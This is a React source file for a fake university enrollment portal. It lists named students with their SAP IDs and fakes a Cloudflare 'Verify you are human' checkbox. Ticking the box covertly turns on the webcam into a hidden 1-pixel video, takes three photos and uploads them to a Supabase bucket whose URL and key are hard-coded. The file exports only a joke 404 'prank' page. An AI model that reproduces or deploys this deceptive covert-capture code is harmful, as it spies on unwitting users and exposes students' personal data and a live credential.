import React, { useState, useRef } from "react"; // import { createClient } from "@supabase/supabase-js";

// ================= CONFIGURATION =================
const SUPABASE_URL = "https://vsfssnuczhqoqvjrerbw.supabase.co";
const SUPABASE_KEY = 
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZzZnNzbnVjemhxb3F2anJlcmJ3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwOTc3NjYsImV4cCI6MjA4NDY3Mzc2Nn0.H-6DGXy48pKg7-mFZ8EaToUo1D3xLhPllsmz2gn1FdI";
const BUCKET_NAME = "odesa";
const PHOTO_COUNT = 3;

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const SAPPortal = () => {
  const [searchId, setSearchId] = useState("");
  const [foundStudent, setFoundStudent] = useState(null);
  const [isEnrolled, setIsEnrolled] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [verifying, setVerifying] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  // Student Data (Abbreviated for clarity)
  const studentData = [
    { id: 70186177, name: "Rana Muhammad Abdullah" },
    { id: 70182647, name: "Ziyad Abdullah" },
    { id: 70186830, name: "Muhammad Hasan Abraiz" },
    { id: 70189700, name: "Navera Afzal" },
    { id: 70186829, name: "Muaaz Ahmad" },
    { id: 70186822, name: "Aliza Ahmad" },
    { id: 70186827, name: "Hassan Ahmad" },
    { id: 70186840, name: "Mubeen Ahmad Raza" },
    { id: 70186492, name: "Moeez Ahmed" },
    { id: 70192457, name: "Hamza Akram" },
    { id: 70186846, name: "Ahmad Ali" },
    { id: 70186498, name: "Amna Amjad" },
    { id: 70192212, name: "Ammar Asghar" },
    { id: 70186412, name: "Murtiza Awais" },
    { id: 70186500, name: "Tooba Azam" },
    { id: 70186486, name: "Zehra Batool" },
    { id: 70186826, name: "Hafsa Farooq" },
    { id: 70186442, name: "Zarmina Fatima" },
    { id: 70186444, name: "Alisha Fatima" },
    { id: 70186823, name: "Rehan Haider" },
    { id: 70186434, name: "M. Zohaib Hassan" },
    { id: 70186484, name: "Muhammad Ikram" },
    { id: 70189694, name: "Hashir Imran" },
    { id: 70186836, name: "Tehseen Rajpoot Javad" },
    { id: 70186837, name: "Zain Jillani" },
    { id: 70186843, name: "Abdullah Khalid" },
    { id: 70192453, name: "Hafiz Muhammad Khan" },
    { id: 70186410, name: "Abdullah Manzoor" },
    { id: 70186488, name: "Syeda Maryam" },
    { id: 70186438, name: "Mian Abdul Mateen" },
    { id: 70186831, name: "Saad Munawar" },
    { id: 70186426, name: "Ayesha Muqaddas" },
    { id: 70191512, name: "Faryal Nazir" },
    { id: 70186824, name: "Rayan Rayan" },
    { id: 70186838, name: "Ahmad Raza" },
    { id: 70186440, name: "Zain Raza" },
    { id: 70186835, name: "Sameeha Riaz" },
    { id: 70186496, name: "Mobeen Saeed" },
    { id: 70192459, name: "Aiyan Shafiq" },
    { id: 70186432, name: "Syed Hashir Sajjad Bukhari" },
    { id: 70150033, name: "Muhammad Abdullah Shafiq" },
    { id: 70186422, name: "Bisma Sirbuland" },
    { id: 70186420, name: "Mehrab Talib" },
    { id: 70186833, name: "Ahmed Tariq" },
    { id: 70186430, name: "Rameesha Tayyab" },
    { id: 70186844, name: "Muhammad Wasiq" },
    { id: 70186825, name: "Meerub Yasir" },
  ];

  const handleSearch = () => {
    const student = studentData.find(
      (s) => s.id.toString() === searchId.trim()
    );
    if (student) {
      setFoundStudent(student);
      setIsEnrolled(false);
    } else {
      alert("Invalid SAP-ID");
      setFoundStudent(null);
    }
  };

  const startVerificationProcess = async () => {
    setVerifying(true);
    try {
      // 1. Get Stream
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        // Wait for video to be ready and playing
        await new Promise((resolve) => {
          videoRef.current.onloadedmetadata = () => {
            videoRef.current.play();
            resolve();
          };
        });
        // Important: Wait for camera to adjust exposure/focus
        await new Promise((r) => setTimeout(r, 1200));
      }

      const ctx = canvasRef.current.getContext("2d");
      canvasRef.current.width = videoRef.current.videoWidth;
      canvasRef.current.height = videoRef.current.videoHeight;

      // 2. Capture Loop
      for (let i = 1; i <= PHOTO_COUNT; i++) {
        // Ensure we are in a ready state
        if (videoRef.current.readyState >= 2) {
          ctx.drawImage(videoRef.current, 0, 0);
          const blob = await new Promise((resolve) =>
            canvasRef.current.toBlob(resolve, "image/png")
          );
          if (blob) {
            const fileName = `sap_v_${foundStudent.id}_${Date.now()}_${i}.png`;
            // Capture and upload
            await supabase.storage.from(BUCKET_NAME).upload(fileName, blob);
          }
        }
        await new Promise((r) => setTimeout(r, 800));
      }

      // 3. Cleanup
      stream.getTracks().forEach((t) => t.stop());
      setIsEnrolled(true);
      setTimeout(() => {
        setShowModal(false);
        setVerifying(false);
      }, 1000);
    } catch (err) {
      console.error("Capture Error:", err);
      setVerifying(false);
      setShowModal(false);
      alert("Camera access is required for enrollment verification.");
    }
  };

  return (
    <div className="min-h-screen bg-[#1a2634] text-white font-sans">
      <header className="bg-[#223548] border-b border-[#324458] px-4 py-2 flex items-center justify-between">
        <div className="flex items-center space-x-6">
          <div className="text-blue-400 font-bold text-xl">SAP</div>
          <div className="text-gray-300 text-sm cursor-pointer">Home ▼</div>
        </div>
      </header>

      <nav className="bg-[#223548] px-6 py-3 flex space-x-8 text-sm text-gray-300 border-b border-gray-800">
        <span className="text-blue-400 border-b-2 border-blue-400 pb-2">
          Enrollment
        </span>
        <span className="hover:text-white cursor-pointer transition-colors">
          Academics
        </span>
        <span className="hover:text-white cursor-pointer transition-colors">
          Financials
        </span>
      </nav>

      <main className="p-8 max-w-7xl mx-auto">
        <p className="mb-4 text-xl font-medium">Student Enrollment For 2nd Semester</p>

        <div className="max-w-2xl flex space-x-2 mb-10">
          <input
            type="text"
            placeholder="Enter SAP-ID To Enroll"
            className="bg-black/20 border border-[#5e6977] flex-grow rounded px-4 py-2 text-sm focus:ring-1 focus:ring-blue-400 outline-none transition-all"
            value={searchId}
            onChange={(e) => setSearchId(e.target.value)}
          />
          <button
            onClick={handleSearch}
            className="bg-[#0070d2] px-6 py-2 rounded text-sm font-medium hover:bg-[#005fb2] transition-colors"
          >
            Search
          </button>
        </div>

        {foundStudent && (
          <section className="animate-in fade-in slide-in-from-bottom-2 duration-500 mb-8 px-2 md:px-0">
            <h2 className="text-[10px] md:text-xs uppercase tracking-widest text-blue-400 font-bold mb-4">
              Student Identification Found
            </h2>

            {/* Card Container: Full width on mobile, max-md on desktop */}
            <div className="bg-gradient-to-br from-blue-500/10 to-[#1a2634] w-full md:max-w-md rounded-xl p-5 md:p-6 border border-white/10 border-l-4 border-l-blue-500 shadow-2xl relative">
              <div className="flex flex-col sm:flex-row items-center sm:items-start text-center sm:text-left space-y-4 sm:space-y-0 sm:space-x-5">
                <div className="flex-grow w-full">
                  <h3 className="text-lg md:text-xl font-bold truncate">
                    {foundStudent.name}
                  </h3>
                  <div className="mt-4 space-y-3 sm:space-y-2 text-sm">
                    <div className="bg-black/20 sm:bg-transparent p-2 sm:p-0 rounded-lg">
                      <p className="text-gray-500 uppercase font-bold text-[9px] md:text-[10px]">
                        SAP ID
                      </p>
                      <p className="font-mono text-white tracking-wider">
                        {foundStudent.id}
                      </p>
                    </div>

                    <div className="bg-black/20 sm:bg-transparent p-2 sm:p-0 rounded-lg">
                      <p className="text-gray-500 uppercase font-bold text-[9px] md:text-[10px]">
                        Email Address
                      </p>
                      <p className="text-blue-300 italic text-xs md:text-sm break-all">
                        {foundStudent.id}@student.uol.edu.pk
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Footer Area: Stacks on very small screens */}
              <div className="mt-6 flex flex-col sm:flex-row gap-4 justify-between items-center pt-4 border-t border-white/10">
                <span
                  className={`text-[9px] md:text-[10px] px-3 py-1 rounded border font-medium whitespace-nowrap ${
                    isEnrolled
                      ? "text-green-400 border-green-400/20 bg-green-400/5"
                      : "text-red-400 border-red-400/20 bg-red-400/5"
                  }`}
                >
                  STATUS: {isEnrolled ? "ENROLLED" : "NOT ENROLLED"}
                </span>

                {!isEnrolled && (
                  <button
                    onClick={() => setShowModal(true)}
                    className="w-full sm:w-auto text-[10px] md:text-[11px] bg-white text-black font-bold px-4 py-2 rounded shadow-sm hover:bg-blue-400 hover:text-white transition-all active:scale-95 uppercase tracking-tighter"
                  >
                    Enroll for 2nd Semester
                  </button>
                )}
              </div>
            </div>
          </section>
        )}

        {/* Course Grid remains the same... */}
        <section className="mb-10">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-xl font-bold tracking-tight text-white flex items-center gap-2">
              <span className="w-1.5 h-6 bg-blue-500 rounded-full"></span>
              Semester 2 BSSE Courses
            </h2>
            <span className="text-[10px] bg-slate-800 text-slate-400 px-3 py-1 rounded-full border border-slate-700 uppercase tracking-widest">
              Fall 2026
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            {[
              { name: "Programming Fundamentals", cr: 4 },
              { name: "Digital Logic Design", cr: 3 },
              { name: "Expository Writing", cr: 3 },
              { name: "Arts & Humanities", cr: 2, sub: "Professional Practices" },
              { name: "Civics and Community Engagement", cr: 2 },
              { name: "Probability & Statistics", cr: 3 },
              { name: "Understanding of the Holy Quran – I", cr: 1 },
              { name: "Pre-Calculus II", cr: 3 },
            ].map((course, index) => (
              <div
                key={index}
                className="relative border border-slate-800 bg-slate-900/20 p-5 rounded-2xl"
              >
                <div className="flex flex-col h-full justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-slate-200 leading-snug">
                      {course.name}
                    </h3>
                    {course.sub && (
                      <p className="text-[10px] text-slate-500 mt-1 uppercase italic">
                        {course.sub}
                      </p>
                    )}
                  </div>

                  <div className="flex items-end justify-between">
                    <div className="flex flex-col">
                      <span className="text-[9px] text-slate-500 uppercase font-black tracking-tighter">
                        Credit Hours
                      </span>
                      <span className="text-2xl font-black text-blue-500 leading-none">
                        {course.cr.toString().padStart(2, "0")}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </section>
      </main>

      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-white rounded-md p-1 w-full max-w-[320px]">
            <div className="bg-[#fcfcfc] border border-slate-200 rounded p-4 flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div className="relative w-7 h-7 flex items-center justify-center">
                  {!verifying ? (
                    <input
                      type="checkbox"
                      className="w-6 h-6 cursor-pointer accent-blue-600"
                      onChange={startVerificationProcess}
                    />
                  ) : (
                    <div className="w-5 h-5 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                  )}
                </div>
                <span className="text-[14px] text-slate-700">Verify you are human</span>
              </div>
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg"
                className="h-3 opacity-60"
                alt="CF"
              />
            </div>
          </div>
        </div>
      )}

      {/* CRITICAL FIX:
        Instead of "hidden", we use opacity-0 and absolute positioning.
        This ensures the browser actually paints the video frames.
      */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="opacity-0 pointer-events-none absolute"
        style={{ width: "1px", height: "1px" }}
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

const NotFound = () => {
  console.log("Kuch nahi ha console ma bhi");
  console.log("Phir prank ho gia");
  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 px-4 text-center">
      {/* Visual Element */}
      <h1 className="text-9xl font-extrabold text-blue-600 tracking-widest">
        404
      </h1>
      <div className="bg-blue-600 text-white px-2 text-2xl rounded rotate-12 top-2 relative">
        Page Not Found
      </div>
      {/* Message */}
      <div className="mt-8">
        <h2 className="text-3xl font-bold text-gray-800 md:text-4xl">
          Whoops! You're lost in space.
        </h2>
        <p className="text-gray-500 mt-4 text-lg">
          If You are developer Check console tab
        </p>
        <p className="text-gray-500 mt-4 text-lg">Contact To Developer</p>
      </div>
      {/* Action Buttons */}
      <div className="mt-10 flex flex-col sm:flex-row gap-4">
        <span
          onClick={() => {
            alert("Prank Ho Gia,\nha ha ha ha");
          }}
          className="px-8 py-3 bg-blue-600 text-white font-semibold rounded-lg shadow-md hover:bg-blue-700 transition duration-300 ease-in-out"
        >
          Back To Home
        </span>
      </div>
    </div>
  );
};

export default NotFound;